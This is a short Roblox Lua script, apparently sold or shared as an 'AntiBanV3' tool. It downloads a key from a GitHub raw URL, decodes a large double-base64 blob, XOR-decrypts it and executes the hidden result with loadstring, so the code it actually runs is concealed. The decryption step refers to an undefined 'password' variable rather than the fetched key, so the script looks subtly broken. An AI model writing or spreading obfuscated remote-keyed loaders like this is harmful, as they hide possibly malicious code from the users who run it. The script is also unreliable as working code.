
local HttpService = game:GetService("HttpService")
local key = game:HttpGet("https://raw.githubusercontent.com/Ivanko1202/AntiBanV3/main/password.txt")
local function b64d(data) local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';data=string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(math.floor(f/2^(i-1))%2) end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i = 1, 8 do c=c+((x:sub(i,i)=='1') and 2^(8-i) or 0) end return string.char(c) end)) end
local encrypted = "RlI5emMyRlRUMEZIQ0N3VE5GWkZYVmNzQVFCUkFoRlVJVVlEWVVST1lsY0xRd01CSGhsUlZ6SktmRmRKWEFONVQwRkhlR0ZuY2RDSjBJRFJzTkdKMFpyUmh0R0NFRmxSUkVuUWpkR1EwS0RRbzlHVDBJblFzbW9kVjFoQlM5Q3EwWUxRb05DRzBJclJ1ZEd0Q05HWDBZUFFydEdiMFovUW1OR3IwYVhScjlDTkVkQ0swTGZSbHRHRTBZWFJzTkdNMFp4ZFl4NU1OamxrU0JzbFZSWUZVVHNIRmh0V1NrRUlGVXNVRGd3Q1loSXlKV1JVUndFSEd4VVlVeklZQ0VvRUdSZE1hMzBtV1JRSUhVcy9BQWRXVm1GTldoMGFEQVJIWlhVd01GcFVEekFMRENOVkF4UWRDbFpKU1RBWkp4SWtaUkliQndJSUVrQWFNbDVIU3dvZlR5MElPelE3QVZ0UVRCSWNXRTBRSVE0VkVGWVRHRW9pTFJRcldpY0ZFQklPQldnNUZSOEkwTHZSbGRHSTBaSFJrOUdhMGFEUnJIZlFrTkNJMEluUnROR0owWlJZMFk3UWdkQzAwWnpSZ05DLzBJRkJROUdXMFpiUnY5R0MwSXZRZzlHSzBaZFIwWm5SbU5HSjBLTFJzQlFTMGFIUWx0R2FVOUdTMFpSSDBhblFsdEdzMGE4WFgxd2JUdEM3VUZrQkF4MGJRRWhoQ0FFaEZpWVdGUkFCQ2hnRUIwQVlEd2hURm5sbERRZzdORHR4UTE1U0VBSWRGQkJNUWhJSVh4SU9iZ0l0RkN0YVZ3OEVCUWdEQzF4V0VseEhEQlFEQkNVaEpUWWlSRlJHWDBkeWVVUWVCUk1GVmdWTFdVNHNHRDRXQXdZV0RBY1NCamt4UmtGY0J4WkJOUUlnSVhkc0Z4TmxEaW9kRVVRWlFnaEpadzRNQXdJblRXb1VWMGRmUzBNRERWUmZYazFNU3hJQkJVZDZHaGx6RjE1SFYwdzNOblpUUzFSSEhVRkpSQkppT3lWUlRVdDdZZ0lSUWtkWFZVOUVEaGRQRlE4OU8xMVlQbGRhQlU0blhCQVhGeG9LRXdnRlJBY3lGaU5FQkVFVEVoc1dFVUJkUVFFSUR4eGxhRzVSSlRRd1cxMGRFUnNXRXhsN2EzME1YUVZoYldjdUdDMGVWZEc3MExEUm5rdlJpZEdUMGJiUWh0Q0cwYU1JMFp2UmlkQ3QwWm5SbGRHZzBKWFJxZEdqMElmUWpORytXVXhSZWprVURnY01PV2hpQ0FFbFgyalFxTkdHMEt6Umo5R2YwS0JYMFovUWh0Q0QwYjdRbjlHblM5R04wSzNSbTlHYzBKYlFrdEd2MEpQUnV4OFYwYWpSbTlDNDBZWFFoOUdCMFozUXQ5Q28wYkhSbWRDcDBaRk8wYnJSaE5DSzBiVlgwWjNSaXRDa1M5QzIwWlBSczlDRzBiUFFtQVpKV21Wb0FqWXhYVFJaVlQ5OUFoY1RVUjFDQndwQkJBNEtLVGNlYWd0WElCOFlIeFlNVUYwY1JrMGNXMDB5QkNvd01qOXdSRnhWUWxnOFh4SURHRGxmQUJJQkhIZ2dLMThETHg0WktCOExYMXdhQ25nSEVoWUVGUjhnUG5NZUdEOEVEUW9WVlI4bEFRQWRMd29KQzJKS2FoUW5FRFVPQ2dNS1lFeFRTa1FPSmlaRGJTczJKVFJTWDNJQ0IxWWlWUUlIQUNaZE1oc0ZHU3hYZHhZUkNCMFlEbjFvWDFkUlNVUkxGUjBBQ2oxMWFuRitYMFlERHhZVFZWOE1FUjRiUXkwV0R5OFNhQnBYR2hJWkRoSU1kRTFiQVNJTkFRNE1BbllHUGl0U0VRaFhPendaWFVOTUdneEVTVnRJVG5GQmVocFhXVjFMV1U1U0dqSlVXa2tHRmtFeENDczhJemhZWHhWS1RpMDBXUnhRV2dkV0ZrTlVRSGRiYWh0R1VVRkhTMGRNQmhRU0JSbGZSa1pyQVNvME9qUVpjMVFVQlI4Q1h3UU1FQ3BjRFFRV1hXSkthblVZQlI0WldGa0VRVmRmZW04cFcxNVJTM2hrWjMwWEFBVmVaQjRDVVJ3SFdpdGNFdzhCSEJFZU1GTW5BQWtPQjFkZkV3ZzRUbG9LSGdwUEpqc2hQaWRTRVFoWEdnb0ZWWHNFQmdoZUJFVWdIQ01RTFZjVkJSUkxWbGNXUVUxWElrNFpFZ0lFU1JrN05EbFlRMlVZQnhZRUVFeENJZ3hRRlFRV1hHd1pMMEZmV1Y5ZVIxZFNIUTBiSWs0WkVnSUVTUm8wTkRwUVExb0NBQndrUWhBTUJ4bFNFdzRLRFR0WGR4WkhSMEZlWVJFUVVsVlhCbXNIR2g4U0l6MG1ORFJaVlZRWkdndFFEVkVXQmh4V2F3MFdEeThTWkhRWUd4VU9HVG9OVjEwU0ZRZ3VIUm9NU1JvNkpUVlNRM2dZQ2gxZWVSOFJFUjA1QnhrRkF5ZE5Ia0VTREI4NEFnMEhHMjEyUVVWWlhRRUVFSEJsZTNFRUJ3VmJUa2hjRUVOYlJFQWZRVWtyR3paVlpoWlZPQVFLRDFWT0V3Z2NHd1JMQngwVUFuRmZYVDFZVWxRYlRnMFpjeDRRR2d4QlFWWkVKeXdFUGxjWkNoUkZCUklWR3hwbllXc0VBUUVFRlhwNWR6ZEZVRmdTUjNJRldUSU5CZ2RXRTBVbkFUQVpMMFFsQ0JVQ0hnUkNEaGhuYkVFR1hRRUVFSEJsZTNFR0F4eDlaQlFmVXhBT1ZCMWFGUWNCVG45WEExZ0VIUkFGQ0JKTVhWMUZBQW8vRmhjVkt6azNNajBWSFJVUkhCa2RWVmhvQUFCSERRNUtQU3NOTHhaS1NTUXZBaHBRSFZaWFh3QmFYMDlSUzNobGUzRUVBUng5R2hFRVhCUk1JQXhMRlV0WlRtQW5NM0lTQ0FVRFN3dENaMWRWVDBRT1NVOHVJUjUxSzNGN1hsSk5USElFV1FVT0VVZG5CQk1RTFMwYkpVUkVTVXhMS0JnT1hFb0JCa1lPQkVkUVMybDVabmc5UlZ3REFoMWVjaEFCSHc1QkRoNEtDaFlGSzFnRUdSQVpEaGtCU2hnUENCbGhCd1lWQ3oxN0VUNVpSUlZLVGowZVJSeE1NZ1pkRlVVakFUWWZLMXMxQmgwUFlRTUxSMVJYQm53T0N4c3lEaUl3ZDJ3WEFBMTlaQlFmVXhBT1ZCcFFFd1FJQWc0WUxSWktTVGdGR0FNRFhWdFhCa1lPQkVkRE5Ec25PRDFiV0ZzUUtBb1JYUlJBV0VsVkV3b0pDMnQ5T1ZVRkJoMEhKeGdGSFdoZFcwRWZHZ0FQUjJWMUFoVmVYQWRaQUIwSEdFRk9WRmdEVFV0VVFtSkVmeDk5R2hJWkJCc09mMWRWQm5zQ0NRcEJXbmdBRXpoYUF4c1pDdzlZQVYxQ1dWc0RUVXRWUW1KYWNnWmVZd0lJR1JnT1gzUmRUd1lvRWdFWEJpc0dQaXRTRVFoWE96d1pYVU5NR2d4RVNWdElUbkpiYWdaYlNVQmJXMGRMT1V0UldrY0hIeU1PQUhZR05DTllYVmsxRHdva1dCZ0JId2RXRWhoRVUySkRRRVVVR3g0SEJ6c05WQlp3U1VzQUZCME9Fall4QXlOV1gwWUhEd29WWGhJYlZGUVRVVVZXWkRFVU9Ga2JCVDBFREZrZ1VsdFpUMW9FQmdFRkpEYzVPQ01FRVFoWExSY2NYd05SV2c5QkRnWTJLUUJmZUFOYlcwUkhXVUpMT1V0UldrY0hIeU1PQUhZWE9DTlRWRWNrQndJVllCZ2FFUVVUWEV0VVpFZ2JKVlVXQlZFSEJCQTJWa0JHQ0JWTE9nRVNFems3TkRRWlgxQUFSbG9rVlFrV09BaFJCQWRHUW1JRUtVUVlCUjBuQkJCTE9WUmRUM3dPQ3h0UE56Y21QaVZlWGx0WFUxZ2xkQmdQUmtkZEJCeE1YbTVYZWhwWFdWMUxXMTVvWDFkVmZFMFRCMEV5RGlJd2Qyd1haSEVlQTBwZVhoUVZYRmdmUVVaVlhtNVhlaHBYV0VGYlcxNW9YMWRWZkUwVEIwRWpCanMrTUNOWVJGc1RPZ29SWGdJU0ZSdFdEd2dkVG45WGV6d2JCaFkvRGc4V0hXeFhVRndvSEFNT0ZXdDFhbkYwWGxrWUhFdGVYaFFWWEZrZlVFZFVSMGdiSlZFakRBa2ZSVEVOWFV3U0ZRZ3VIUm9NU1I0Nk9TVVpjbG9UQzNJY1h4WTJFUkZIVHo4QkZqWWtJMHdTU1V4TFdrTm9YMWRWZkUwVEIwRTFBaUFoRHhCYldGSVpBeDBlUkZGZlZDeGRGQVpLT2ljUFBtNDJCUmdNQlJvSFhVd2NaRTBOQjJVTkNEOEJNaWxESDJFU0Znd3BjUjBMRXdkZUJBVVFUbjlYRDFnQ0JGOC9EZzhXYW5sZVFVOEZIZ29QRTNZQk9DRTlYVm9RT2gwSVJGODJFUkZITmhrRkhqSVNMaFpLU1FVWkhoSm9YMWRWZkUwVEIwRTFBaUFoZDJ3WEV4ZDlBaGNYWkJRYUFFZG5CQk1RUFRZRkpWMFNQUU1LQlFRU1VrcFhSa3NTVTFKQlYzWnRYVnRiWGxZV0FsZ1dSUjhCQUFCY0Qwc0lBU1ZmSjBVUVFIdGlCeGdCVWxRU1hGdExUazlEUEhwN2VUNUVIMUVXR2gxWUVsUXFUa3grVzA0M1RHdFpaQlFxU1ZOaFloc05WR3hYVUZ4Rkp3b1pFM2hvZHlWRUVSdFpUaFVEVjFGTVdra1JQUVZHVG14WmFsb1lEaVVPRXdOTVoxMUtYQ0lPSFF0cmJYVjRkOUdHMElYUWlkR3kwWWZSbDlHRjBLWVEwWS9SazlDeDBaZlFoOUdaWVFJQk1GY2pGa3BKUUVkTFJGSVRYRjBpSVI4U0RRMENkanc1SWxKRFFWOE1BUUJSQWhFUkdoOUJEUkVBSVFNaldSbEJXR0ZpZmc1Y1h4b0tjMGxkUVFoSmRuY0tjZENwMElEUnZ0Q3cwWlBRczlHSkVOR1AwWlBRc2RHWDBJZEIwWnZSbnRDczBiclJoZEd5MGJiUmlkR2IwWUhSbGtWVlN6a3hWMFpNUW5rS0R3TlNYM3A4RjlDdDBJWFF0dEdVMEx2Umd0Q0EwWXpSbjlDN1NkQ1AwWlRRcTlHUjBaalJ0OUdGMGI4V1gxcEE0b0c0WDBkTE9WNWRXZ2dDVTFKQlZHbDVkMlVIRVZFWVpIRUVVUk1PRVVkYUR4Z0JIRFpmS0U4SENBSVlEZ1JPRTE1SFJrc2ZHZ0FQVDNGZlhsaGJYbEpmVENOU0hsOExXa2NSUEV2UmhkR2IwSURSZ3RHNDBJYlF1RW5SamRHYjBLclJqZEdhMGJQUWh0Q0EwSkxRbUV2UmlkR1UwWm5Sa3RHbDBKZlJwM0hRaDlDTDBiZlJqOUdjMFlEUXNOQ08wWVBSa3RHSjBaa2RRMEp1WjBzZUxCWWVTVXhXUzBSVUUweGFUVVpMQVFvVkVpbzdkelJaVlQ5K1p4RVdFQmhDU1ZRVFVseEVHaW9TSkR4K1lIZ2JDQllPWHhCVVhVWUlCd1lPQ1hCOFhWZytPRHdmQVJjYlZnUU1GeDFhRGdWTUNTTWFMeGcvSFFVYkxCSVdIeGhVWFVZSUJ3WU9DWEI3ZVg4ZUVVY1NHZzBDWGxGQVZrbFdEdzlOWkV0K1ExTVpEVmhoWW40SFhWdzRJU0VDRlU4SVIyVm9kMklQRVVFZkN4WjZPWGhyQkFwU0RRZE1DRGNaS1VJZUJoOURRbjFyT2pFN1cwMGZBUW9BQXpjN095Z2ZWbEFESEJrSFhSUVdGUjFTQXdjQlJpVVdKMU5lUlZFTkNoc1JWaEU0SVNGaWVnZ0VFeW8wSUR4U1JWUUREeG9jVlZrRkZRUldTRVU3TVNzWkxsTVBTVXhMQlJJVlVGdGVSMXNlQVFwSkFTMDdOQ1ZlWGx0ZkhSMGNWbDFDSDBBNWFHSnRaMHNlTEJZY1NVeFdTMVVxUjB4Q2IwMGZVVThPRlhnK2Qyd0tFUmMvR2d3QVlCNFJBRXNURlFNQkFHSUZMMElDR3g5TEJSNE9FMTFjVENKaWVtWm9iaW93SXlSRlh4VUZEdzhYVlFWS0J3eGZCMGRFQld0OVF6OStZQlFGRDE1b09qRTdUVVlQV21Wb2JqMDdNMXMrT0Z3UlRoRlFEVXhDUjFBVEZRTUJBRWgrUXo4SENoQUhCMThFUmxaUlhFRUVIVWRJYlZGY1hsaFFVRmdTVkQ4VlJDSUhCaDlhQWc1TVRBNFlMV1VTR3djQ0NCSkFHaFovVFZzWUVnZ0VLQzBoYlJKWVgxc1NEUXhZVmdRTUZ4MWFEZ1ZNQXpFUVl6eCtZSGhpWWg0RUUxVkJUeElISEJnRUZYQjhiVGRlWDFGZlRCa2VSQmdCSEF4U0ZVbE5UallmTDFoWEd4UWZIZ1VNRTFaYlJBZ09IUXRyYmxGY1hqUlpWUng5WjNGNVZSOEdYV002YUE0S0NraCtRMThSU1JoTFZrcENCd2dTWEVBT0hXVm9ibEVsTkRCYlhSMFJHeFlUUkJnTkdrRWFhMkp0WjBzZUxCWWZCaDRBQmhJV1VsVlhYRUFFRjA4VkR6MDdYVmcrT0R4K0JoY2ZXeHdIQUFoZUJCOE1BU1pmTFZjYURGMUxTU2c5WFZsZlRVc0tId05EUzNneklqOVVSVndZQUZBRFZSMEVXRWtkVDBWTlpFdCtRejkrWUIwRUNCWU9FMVZYWEVBRUYwOWNSejh3SXo5V1hGQVVEeFFjWFJRV0hBWlhTVUp1WjB0K1F6OStBQmRMQmhJV1cxZFdDQlZXVTAwcURqcytkWEZEV1ZBWlRnb1ZSQVFRR2tsV0R3OXVaMHQrUXo5K0d4UWZIZ1VNRTB0WFJFNHdIZ29WRHpjeENubEVWRmtSUWxoZUhsOUxmbUE2YUdKdEN5d1RZengrWUhoaURoa0dPVEU3SVUwRkYwWnJibEV3T1RVOU9GQVpDbEY2VlI4R2ZtTWVURXZSdnRHVDBielJpTkd3MElaOUJSNElDaHRDUjFkVlQwUU9NUnNQUjJWMUhqOUVSVlFaRFIxZVhoUVZYRXRuQkJNUUxEY0RQbGtaUzExTERRVURYbDBiSWx3RUZBZ05BaG9oT1g5a1dFOFNUa1ZRWlRVTEdWc2REdzRUUm5OYmFodEZXVjFMVzF0Q0FBZ2JJbHdFRkFnTkFob2hPWDluWGtZZUdoRWZYbEZmVkR4M0NBWldRQ3dTUFI1SFJWRmFXMXRDQWhRU0JSdGVXbVVWQ0Q4eU96UjFSVnRaTEJrVFd4WVFHeHhkQlNnTEFpMEZlUlpLU1RJRUJ4Z1FBQlpVV2tjR0lTZ2pUMkJsZTNFREFSbFhXa2haT2dVTkV3NWZCQ2tRQUd3akwwNERLaDRIQkFWUkV3VVNhMGNISEIxU1NUWXdJSGtHSFFSYlgxRjZSQjRGRXdWV0l4OEtRQVFZSkVKWFZGRXVCUUlQSFg1ZFJseEZOQUFWRHprNEZUNWJWVDhEQVI4WFhCUWdBQWNkTlE0Y0doRWVNRk5YVkZGYVgzMFdYRjlWUkUwcEJ3RlBNejB0STNFS0VSZlJwZEdVMFlQUXZ0RzMwWW5Rb05DNFNkQ0IwS0RSbmtUUmtOR3owTExSdE5DQzBMeExlMkVmR0FWVVZGZHFYQVZkSWc0U0t6QVZKRU5GV2hsZk94eFpFZ2xPS2x3UEJRRU5ObDhzUXhrS0JRSUVHVW9hTWp0Y1J3d1VBd1FsSVNVMklrUlVSbDlIY25sRUhnVVRCVllqSHdwQUZoSXlRbGRVVVI4RUVBVmZYVllJU1FVWFQwUFJ1ZEdwMEpEUnFkR2wwYndSMElmUmpkR1YwTGJRdDlDRjBZelFxVlpKWEJOTFJ0RzgwYmpSak5DRTBiSFJqOUNyMEwxTDBablF0dEdYRTlDRzBJUFJyZENXMFovUXVFMXJiaXc2TURaYlZIY0RBRll5VVJJSkV4dGNGQVVBTFMwYkpVUkVTVXhMSHhnRlZGUlhUQWdLSFF0QkpEYzVPQ01FSDFNRkFSVWlkek5LUUZ3ZlFWTlVRbUpEZng5WEJnTkxLQmdPWEVvQkJrNFpIQUl6SUJwOWIyRWJFUUZIUWxoRUFGaG9FUWRYU0dGdUFpMFFZaFFuRURVT0NnTUtFMzluWVFqUm5OR0QwWnpRb2RDazBhN1JvTkdxZnhmUXJOQ0YwWUhSa3RHQVVOQ0swWXpSbk5HTDBaUFJzRUhSbHRHYzBaalJ0MXRxMGJIUXRkR1gwWURRb0V2UmhkR1kwSWpSdHRHMTBKRFJxdENuVTF0UlI5R20wYVRRa3RHdjBJUFFqOUNIV1V4Ug=="
local decoded = b64d(b64d(encrypted))
local decrypted = ""; for i = 1, #decoded do decrypted = decrypted .. string.char(string.byte(decoded, i) ~ string.byte(password, ((i - 1) % #password) + 1)) end
loadstring(decrypted)()